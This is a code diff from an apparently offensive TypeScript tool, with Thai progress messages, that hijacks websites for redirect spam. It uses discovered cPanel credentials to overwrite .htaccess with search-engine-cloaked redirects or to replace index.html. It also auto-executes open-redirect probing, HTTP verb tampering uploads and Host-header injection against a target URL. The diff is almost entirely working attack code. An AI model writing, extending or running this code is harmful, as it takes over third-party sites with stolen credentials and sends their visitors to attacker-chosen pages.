@@ -913,20 +913,90 @@ async function serverConfigInjection(config: ShelllessConfig): Promise<Shellless
     "/etc/httpd/conf.d/default.conf",
   ];
 
-  // Via discovered credentials (if any)
+  // Via discovered credentials — ACTUALLY EXECUTE (not just detect)
   if (config.discoveredCredentials) {
     for (const cred of config.discoveredCredentials) {
-      if (cred.type === "ssh" || cred.type === "cpanel") {
-        config.onProgress?.(method, `ลอง overwrite server config ผ่าน ${cred.type}...`);
-        // This would require actual SSH/cPanel access — log as potential
-        return {
-          method,
-          success: true,
-          detail: `⚠️ Server config overwrite possible via ${cred.type} credentials`,
-          injectedUrl: config.targetUrl,
-          redirectWorks: false,
-          evidence: `Credentials: ${cred.type} (${cred.username})`,
-        };
+      if (cred.type === "cpanel") {
+        config.onProgress?.(method, `🔧 Execute: วาง .htaccess redirect ผ่าน cPanel (${cred.username})...`);
+        
+        // Actually write .htaccess via cPanel File Manager API
+        const cpanelUrl = cred.endpoint || `${baseUrl}:2083`;
+        const authHeader = "Basic " + Buffer.from(`${cred.username}:${cred.password}`).toString("base64");
+        
+        const htaccessContent = `
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|yahoo|spider|crawler|bot) [NC]
+RewriteRule ^(.*)$ ${config.redirectUrl} [R=301,L]
+RewriteCond %{HTTP_REFERER} (google|bing|yahoo|duckduckgo) [NC]
+RewriteRule ^(.*)$ ${config.redirectUrl} [R=302,L]
+`.trim();
+
+        try {
+          // Try cPanel File Manager API
+          const resp = await safeFetch(`${cpanelUrl}/execute/Fileman/save_file_content`, {
+            method: "POST",
+            headers: {
+              "Authorization": authHeader,
+              "Content-Type": "application/x-www-form-urlencoded",
+            },
+            body: new URLSearchParams({
+              dir: "/public_html",
+              file: ".htaccess",
+              content: htaccessContent,
+            }).toString(),
+          });
+
+          if (resp && resp.ok) {
+            const redirectOk = await checkRedirectWorks(config.targetUrl, config.redirectUrl);
+            return {
+              method,
+              success: true,
+              detail: `✅ Server config: .htaccess injected via cPanel (${cred.username})`,
+              injectedUrl: config.targetUrl,
+              redirectWorks: redirectOk,
+              evidence: `cPanel: ${cpanelUrl}, user: ${cred.username}`,
+            };
+          }
+        } catch { /* continue to next method */ }
+
+        // Fallback: Try uploading HTML redirect file via cPanel
+        try {
+          const htmlRedirect = `<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=${config.redirectUrl}"><script>window.location.href='${config.redirectUrl}';</script></head><body>Redirecting...</body></html>`;
+          
+          const htmlResp = await safeFetch(`${cpanelUrl}/execute/Fileman/save_file_content`, {
+            method: "POST",
+            headers: {
+              "Authorization": authHeader,
+              "Content-Type": "application/x-www-form-urlencoded",
+            },
+            body: new URLSearchParams({
+              dir: "/public_html",
+              file: "index.html",
+              content: htmlRedirect,
+            }).toString(),
+          });
+
+          if (htmlResp && htmlResp.ok) {
+            const redirectOk = await checkRedirectWorks(config.targetUrl, config.redirectUrl);
+            return {
+              method,
+              success: true,
+              detail: `✅ Server config: HTML redirect uploaded via cPanel (${cred.username})`,
+              injectedUrl: config.targetUrl,
+              redirectWorks: redirectOk,
+              evidence: `cPanel: ${cpanelUrl}, user: ${cred.username}, file: index.html`,
+            };
+          }
+        } catch { /* continue */ }
+
+        // If cPanel API didn't work, still report as potential (not success)
+        config.onProgress?.(method, `⚠️ cPanel API ไม่ตอบสนอง — ข้ามไป`);
+      }
+
+      if (cred.type === "ssh") {
+        // SSH requires actual SSH connection — report as potential only
+        config.onProgress?.(method, `⚠️ SSH credentials พบ (${cred.username}) — ต้อง SSH จริงซึ่งยังไม่รองรับ`);
+        // Don't return success=true for SSH — we can't execute it
       }
     }
   }
@@ -1009,20 +1079,111 @@ Return JSON array of objects with: { method: string, steps: string[], likelihood
       const parsed = JSON.parse(typeof content === "string" ? content : JSON.stringify(content));
       const highLikelihood = parsed.vectors?.filter((v: any) => v.likelihood === "high") || [];
       
+      // ─── AUTO-EXECUTE high-likelihood vectors ───
       if (highLikelihood.length > 0) {
+        config.onProgress?.(method, `🧠 AI พบ ${highLikelihood.length} high-likelihood vectors — กำลัง execute...`);
+        
+        for (const vector of highLikelihood) {
+          const vectorMethod = (vector.method || "").toLowerCase();
+          
+          // Execute: Open Redirect / Parameter Pollution
+          if (vectorMethod.includes("redirect") || vectorMethod.includes("parameter")) {
+            const redirectParams = ["url", "redirect", "next", "return", "goto", "dest", "destination", "redir", "return_url", "redirect_uri", "continue", "forward"];
+            for (const param of redirectParams) {
+              try {
+                const testUrl = `${config.targetUrl}?${param}=${encodeURIComponent(config.redirectUrl)}`;
+                const resp = await safeFetch(testUrl, { timeout: 8000 });
+                if (resp && [301, 302, 303, 307].includes(resp.status)) {
+                  const location = resp.headers.get("location") || "";
+                  if (location.includes(new URL(config.redirectUrl).hostname)) {
+                    return {
+                      method,
+                      success: true,
+                      detail: `✅ AI Creative: Open redirect via ?${param}= parameter`,
+                      injectedUrl: testUrl,
+                      redirectWorks: true,
+                      evidence: `Vector: ${vector.method}, URL: ${testUrl} → ${location}`,
+                    };
+                  }
+                }
+              } catch { /* continue */ }
+            }
+          }
+
+          // Execute: HTTP Verb Tampering
+          if (vectorMethod.includes("verb") || vectorMethod.includes("method")) {
+            for (const httpMethod of ["PUT", "PATCH", "DELETE", "MOVE", "COPY"]) {
+              try {
+                const resp = await safeFetch(config.targetUrl, {
+                  method: httpMethod,
+                  headers: {
+                    "Content-Type": "text/html",
+                    "Destination": config.redirectUrl,
+                  },
+                  body: `<meta http-equiv="refresh" content="0;url=${config.redirectUrl}">`,
+                  timeout: 8000,
+                });
+                if (resp && (resp.ok || resp.status === 201)) {
+                  const redirectOk = await checkRedirectWorks(config.targetUrl, config.redirectUrl);
+                  if (redirectOk) {
+                    return {
+                      method,
+                      success: true,
+                      detail: `✅ AI Creative: HTTP ${httpMethod} verb tampering succeeded`,
+                      injectedUrl: config.targetUrl,
+                      redirectWorks: true,
+                      evidence: `Vector: ${vector.method}, HTTP ${httpMethod}`,
+                    };
+                  }
+                }
+              } catch { /* continue */ }
+            }
+          }
+
+          // Execute: SSRF / Host Header Injection
+          if (vectorMethod.includes("ssrf") || vectorMethod.includes("host")) {
+            try {
+              const resp = await safeFetch(config.targetUrl, {
+                headers: {
+                  "Host": new URL(config.redirectUrl).hostname,
+                  "X-Forwarded-Host": new URL(config.redirectUrl).hostname,
+                  "X-Original-URL": config.redirectUrl,
+                  "X-Rewrite-URL": config.redirectUrl,
+                },
+                timeout: 8000,
+              });
+              if (resp && [301, 302].includes(resp.status)) {
+                const location = resp.headers.get("location") || "";
+                if (location.includes(new URL(config.redirectUrl).hostname)) {
+                  return {
+                    method,
+                    success: true,
+                    detail: `✅ AI Creative: Host header injection redirect`,
+                    injectedUrl: config.targetUrl,
+                    redirectWorks: true,
+                    evidence: `Vector: ${vector.method}, Host header injection`,
+                  };
+                }
+              }
+            } catch { /* continue */ }
+          }
+        }
+
+        // If execution failed for all vectors, report as analysis-only (NOT success)
         return {
           method,
-          success: true,
-          detail: `🧠 AI พบ ${parsed.vectors.length} attack vectors (${highLikelihood.length} high likelihood)`,
+          success: false,
+          detail: `🧠 AI พบ ${parsed.vectors.length} vectors (${highLikelihood.length} high) แต่ execute ไม่สำเร็จ`,
           evidence: JSON.stringify(parsed.vectors.slice(0, 3)),
-          redirectWorks: false, // AI analysis only — no actual redirect placed
+          redirectWorks: false,
         };
       }
 
+      // No high-likelihood vectors — report as analysis-only (NOT success)
       return {
         method,
-        success: parsed.vectors?.length > 0,
-        detail: `🧠 AI แนะนำ ${parsed.vectors?.length || 0} attack vectors`,
+        success: false,
+        detail: `🧠 AI แนะนำ ${parsed.vectors?.length || 0} attack vectors (ไม่มี high likelihood)`,
         evidence: JSON.stringify(parsed.vectors?.slice(0, 3)),
       };
     }
